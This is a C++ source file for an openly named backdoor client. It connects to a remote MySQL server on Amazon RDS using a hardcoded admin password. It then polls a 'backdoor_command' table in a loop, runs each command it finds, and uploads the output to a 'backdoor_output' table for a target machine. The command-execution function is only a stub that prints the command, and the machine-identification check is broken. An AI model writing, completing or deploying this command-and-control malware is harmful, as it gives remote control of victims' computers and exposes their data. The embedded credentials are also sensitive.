#include <stdlib.h>
#include <iostream>
#include <Windows.h>
#include <lmcons.h>
#include <chrono>
#include "mysql_connection.h"
#include <cppconn/driver.h>
#include <cppconn/exception.h>
#include <cppconn/prepared_statement.h>
#include <iostream>
#include <ctime>
using namespace std;


string execute_command(string);
int pc_id = -1;

int main()
{
    sql::Driver* driver;
    sql::Connection* con;
    sql::Statement* stmt;
    sql::ResultSet* res;
    sql::PreparedStatement* pstmt;

    int get_local_hostname(std::string & hostname);
    string output;
    driver = get_driver_instance();
    con = driver->connect("database.cun6wzt30wpz.us-west-1.rds.amazonaws.com", "admin", "databasepassword");

    stmt = con->createStatement();
    stmt->execute("USE DB");
    res = stmt->executeQuery("SELECT id, pc_name FROM backdoor_computer");
    TCHAR computer_name[UNLEN + 1];
    DWORD computer_len = UNLEN + 1;
    GetComputerName((TCHAR*)computer_name, &computer_len);
    while (res->next()) {
          if ("DESKTOP-MDQGCN5" == res->getString("pc_name"))
          {
              pc_id = res->getInt(1);
          }
    }

    cout << pc_id;
    if (pc_id == -1)
    {
        
    }
    while (true)
    {

        res = stmt->executeQuery("SELECT * FROM backdoor_command");
        while (res->next()) {
             string output = "";
             output = execute_command(res->getString("command"));
             pstmt = con->prepareStatement("INSERT INTO backdoor_output(command,output,target_id) VALUES(?,?,?)");
             pstmt->setString(1, res->getString("command"));
             pstmt->setString(2, output);
             pstmt->setInt(3, pc_id);
             pstmt->execute();
             
             pstmt = con->prepareStatement("DELETE FROM backdoor_command WHERE id=?");
             pstmt->setInt(1, res->getInt("id"));
             pstmt->execute();

        }

        Sleep(1);
    }

    delete stmt;
    delete con;

    system("pause");
    return 0;
}
string execute_command(string command)
{
    string output = "";
    cout << command << endl;
    cout << pc_id;
    return output;
}